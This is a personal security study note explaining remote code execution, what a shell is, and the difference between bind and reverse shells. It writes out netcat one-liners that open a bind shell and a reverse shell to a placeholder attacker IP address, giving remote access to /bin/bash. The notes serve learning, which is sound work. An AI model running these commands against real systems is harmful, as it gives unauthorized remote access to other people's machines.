<link href="../styles.module.css" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&display=swap" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&family=Zen+Tokyo+Zoo&display=swap" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&family=Encode+Sans+SC&family=Zen+Tokyo+Zoo&display=swap" rel="stylesheet">


## <span class="copyright">Personal Security Notes <span style="float:right;">By Shatha Barqawi</span>

<br/><br/>

# <span class="title">Shells


<span class="date">Friday, 16/7/2021</span> 


<br/> 

### <span class="linuxBasicsSubs subtitle">RCE (Remote Code Execution)  
* Belongs to the broader class of *Arbitrary Code Execution*. 
* It's a vulnerability in web applications where an attacker is able to run code of their choosing with system level privileges on a server that possesses the appropriate weakness.  
The attacker, if successful in exploiting this vulnerability, would be able to access any if not all information on a server such as DBs that contain information about nonsuspecting clients.
<br/><br/>

### <span class="linuxBasicsSubs subtitle">What is a Shell?  
* It's a user interface that is eitehr a CLI or a GUI that makes access to the OS services possible.
<br/><br/>

### <span class="linuxBasicsSubs subtitle">Why call it a Shell?  
* Because it's the outermost layer around the OS.
<br/><br/>

### <span class="linuxBasicsSubs subtitle"> Bind Shell  
* Has the listener running on the target and the attacker connect to the listener in order to gain a remote shell.  
 
* Doesn't work if there are firewalls filtering inbound connections.  

* How to make a Bind Shell?  
  The following command should be executed on the target computer  

  ```console
  nc -nvlp 9999 -e /bin/bash
  ```  

  And the attacker should do the following on their side  

  ```console
   nc -nv [TARGET's IP ADDRESS] 9999
  ```  

* To protect against unauthorized remote access using a bind shell we can write the option `--allow` on the nc command then the IP addresses allowed to connect which is called *Whitelisting* .
<br/><br/>

### <span class="linuxBasicsSubs subtitle">Reverse Shell 

* What's a Reverse Shell?  
  It's when the attacker gains access to a victim's computer where the listener is set on the their system and the they have the target connect to their attack box providing them with a shell access.  

* How to Make a Reverse Shell?  
  The following command should be executed on the target computer  

  ```console
  nc -nv [ATTACKER's IP ADDRESS] 9999 -e /bin/bash
  ```  

  And the attacker should do the following on their side  

  ```console
   nc -nvlp 9999
  ```  
